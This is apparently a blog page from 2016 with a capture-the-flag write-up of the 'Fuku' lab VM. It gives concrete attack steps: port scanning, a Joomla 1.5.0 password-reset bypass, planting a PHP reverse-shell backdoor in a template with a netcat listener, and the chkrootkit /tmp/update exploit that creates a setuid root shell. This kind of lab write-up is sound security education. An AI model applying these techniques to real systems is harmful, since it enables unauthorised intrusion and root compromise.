@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>BNE0x02 - Fuku - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2016-04-15">April 15, 2016</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/sectalks">sectalks</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">BNE0x02 - Fuku</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<h3 id="fuku-ctf:4620d038ef80856257f87c289da6c889">Fuku CTF</h3>
+
+<p>Fuku (pronounced &ldquo;far queue&rdquo;) CTF is designed to fuck with people.</p>
+
+<p>There are a few flag.txt files to grab. The final one is in the /root/ directory. However, the ultimate goal is to get a root shell.</p>
+
+<h3 id="scenario:4620d038ef80856257f87c289da6c889">Scenario</h3>
+
+<p>&ldquo;Bull was pissed when you broke into his Minotaur box. He has taken precautions with another website that he is hosting, implementing IDS, whitelisting, and obfuscation techniques. He is now taunting hackers to try and hack him, believing himself to be safe. It is up to you to put him in his place.&rdquo;</p>
+
+<h3 id="hints:4620d038ef80856257f87c289da6c889">Hints</h3>
+
+<p>Some scripting will probably be needed to find a useful port.
+If the machine seems to go down after a while, it probably hasn&rsquo;t. This CTF isn&rsquo;t called Fuku for nothing!</p>
+
+<p>This VM was supremely fuckin annoying, as its IP address changes at regular intervals :)</p>
+
+<p>We first find it at <code>192.168.56.102</code>.  So let&rsquo;s port scan it.</p>
+
+<pre><code class="language-text">root@kali:~# nmap -n -p- 192.168.56.102
+1/tcp     open  tcpmux
+2/tcp     open  compressnet
+3/tcp     open  compressnet
+4/tcp     open  unknown
+5/tcp     open  unknown
+6/tcp     open  unknown
+7/tcp     open  echo
+8/tcp     open  unknown
+9/tcp     open  discard
+10/tcp    open  unknown
+[...snip...]
+65526/tcp open  unknown
+65527/tcp open  unknown
+65528/tcp open  unknown
+65529/tcp open  unknown
+65530/tcp open  unknown
+65531/tcp open  unknown
+65532/tcp open  unknown
+65533/tcp open  unknown
+65534/tcp open  unknown
+65535/tcp open  unknown
+</code></pre>
+
+<p>Every mother-humping port appears open!</p>
+
+<pre><code class="language-text">root@kali:~# nc 192.168.56.102 80
+HTTP/1.0 200 OK
+Server: Apache/2.4.0 (Ubuntu)
+
+&lt;html&gt;
+&lt;body&gt;
+FUKU!&lt;/body&gt;
+&lt;/html&gt;
+
+root@kali:~# nc 192.168.56.102 8080
+HTTP/1.0 200 OK
+Server: Apache/2.4.2 (Ubuntu)
+
+&lt;html&gt;
+&lt;body&gt;
+FUKU!&lt;/body&gt;
+&lt;/html&gt;
+
+root@kali:~# nc 192.168.56.102 1234
+HTTP/1.0 200 OK
+Server: Apache/2.4.0 (Ubuntu)
+
+&lt;html&gt;
+&lt;body&gt;
+FUKU!&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>I suspect this may be some <code>iptables</code> magic, where it redirects every port to one on which Apache is listening.  I manually checked a few common ports to see if anything was hidding, all I found was <code>22</code>.</p>
+
+<pre><code class="language-text">root@kali:~# nc 192.168.56.102 22
+SSH-2.0-OpenSSH_6.7p1 Ubuntu-5ubuntu1
+
+Protocol mismatch.
+</code></pre>
+
+<p>I figured the easiest way to find something different between the ports, was to fetch the content of each one and compare the data sizes or something.</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+for i in {1..65535}; do
+
+	wget 192.168.56.131:$i -q -O $i -t 1 &amp;
+
+done
+</code></pre>
+
+<p>Be warned - this pretty much bricked my laptop :D and obviously half way through the scan the IP address changed!!!  Eventually, I got some results.</p>
+
+<pre><code class="language-text">root@kali:~/fuku# ls -lS | head
+total 256612
+-rw-r--r-- 1 root root 14179 Apr 15 20:06 13370
+-rw-r--r-- 1 root root    58 Apr 15 20:06 22
+-rw-r--r-- 1 root root    37 Apr 15 20:06 1
+-rw-r--r-- 1 root root    37 Apr 15 20:06 10
+-rw-r--r-- 1 root root    37 Apr 15 20:06 100
+-rw-r--r-- 1 root root    37 Apr 15 20:06 10000
+-rw-r--r-- 1 root root    37 Apr 15 20:06 10001
+-rw-r--r-- 1 root root    37 Apr 15 20:06 10002
+</code></pre>
+
+<p>Reading the dump for port <code>13370</code>, we can see this is an installation of Jooma.  We can hop over in a browser for confirmation, and we see a lovely Japanese Rick Roll rendition.</p>
+
+<h2 id="joomla:4620d038ef80856257f87c289da6c889">Joomla</h2>
+
+<p>The version of Joomla installed is <code>1.5.0</code>, which has a remote admin password change vulnerability.  So we can navigate to <code>/index.php?option=com_user&amp;view=reset&amp;layout=confirm</code>, pop a <code>'</code> in the text box and we&rsquo;re free to set any new password we wish.</p>
+
+<p>We can then navigate to <code>/administrator</code> and log in with our new creds; then get a PHP shell by uploading a backdoor into the template source code and requesting the page.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/fuku/joomla-admin.png"  />
+    
+    
+</figure>
+</div>
+
+<p>I just used <code>/usr/share/webshells/php/php-reverse-shell.php</code> for this.</p>
+
+<pre><code class="language-text">root@kali:~/fuku# nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.124] 40273
+haha! FUKU! Only root can run that command.
+ 05:38:31 up  1:14,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+haha! FUKU! Only root can run that command.
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+haha! FUKU! Only root can run that command.
+</code></pre>
+
+<p>It seems there&rsquo;s some limitation going on with what commands we can run, which might get interesting.</p>
+
+<h2 id="flag-1:4620d038ef80856257f87c289da6c889">Flag 1</h2>
+
+<pre><code class="language-text">$ cat /var/www/html/flag.txt
+Did you find this flag by guessing? Or possibly by looking in the robots.txt file?
+Maybe you found it after getting a shell, by using a command like &quot;find / -name flag.txt&quot; ?
+Random keyboard smash: J7&amp;fVbh2kTy[JgS&quot;98$vF4#;&gt;mGcT
+</code></pre>
+
+<h2 id="priv-esc:4620d038ef80856257f87c289da6c889">Priv Esc</h2>
+
+<pre><code class="language-text">$ ps aux
+root      1442  0.0  0.5   5732  2744 ?        S    04:24   0:00 /bin/bash /root/chkrootkit-0.49/run_chkrootkit
+</code></pre>
+
+<p>After a quick Google, we learn that there&rsquo;s a pretty dumb vulnerability in this version of <code>chkrootkit</code>.  It will basically execute <code>/tmp/update</code> as <code>root</code>.  All we must do is place a script/binary there.</p>
+
+<pre><code class="language-text">$ echo &quot;#!/bin/sh&quot;&gt;&gt;update
+$ echo &quot;cp /bin/sh /tmp/sh&quot;&gt;&gt;update
+$ echo &quot;chmod 7777 /tmp/sh&quot;&gt;&gt;update
+$ chmod +x update
+</code></pre>
+
+<p>A few minutes later&hellip;</p>
+
+<pre><code class="language-text">-rwsrwsrwt 1 root     root     112204 Apr 16 06:04 sh
+
+$ ./sh
+cd /root
+ls -l
+
+-rw------- 1 root root       122 Jan  1  1970 flag.txt
+
+cat flag.txt
+Yep, this is a flag. It's worth over 9000 Internet points!
+Random keyboard smash: lkhI6u%RdFEtDjJKIuuiI7i&amp;*iuGf)8$d4gfh%4
+</code></pre>
+
+  </section>
+</article>
+
+</main>
+
+
+</div>
+
+<footer>
+  <div class="container">
+    <span class="copyright">&copy; 2016  rastamouse.me - <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a></span>
+  </div>
+</footer>
+
+</body>
+</html>
+
